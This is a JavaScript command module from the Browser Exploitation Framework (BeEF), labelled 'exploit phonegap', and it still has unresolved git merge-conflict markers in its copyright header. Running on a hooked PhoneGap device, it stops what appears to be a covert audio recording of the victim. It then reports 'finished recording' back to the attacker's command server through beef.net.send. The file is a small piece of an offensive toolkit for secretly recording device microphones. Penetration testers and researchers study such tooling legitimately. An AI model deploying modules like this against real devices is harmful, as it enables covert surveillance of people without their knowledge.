//
<<<<<<< HEAD
// Copyright (c) 2006-2026 Wade Alcorn - wade@bindshell.net
=======
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
>>>>>>> c308392cb3a7bf9025c661931b553d9835aacdcb
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

// exploit phonegap
//
beef.execute(function() {
    m.stopRecord();
    // weirdly setTimeout and stopRecord don't seem to work together
    //milliseconds = "<%== @duration %>" * 1000;
    //setTimeout("m.stopRecord()", milliseconds);
    
    // so here is an ugly work around
    //start = new Date(); 
    //stop = start.getTime() + 5000; 
    //do { 
    //    current = new Date(); 
    //    current = current.getTime(); 
    //} while(current < stop) 
    //m.stopRecord();
    
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "finished recording");	
});
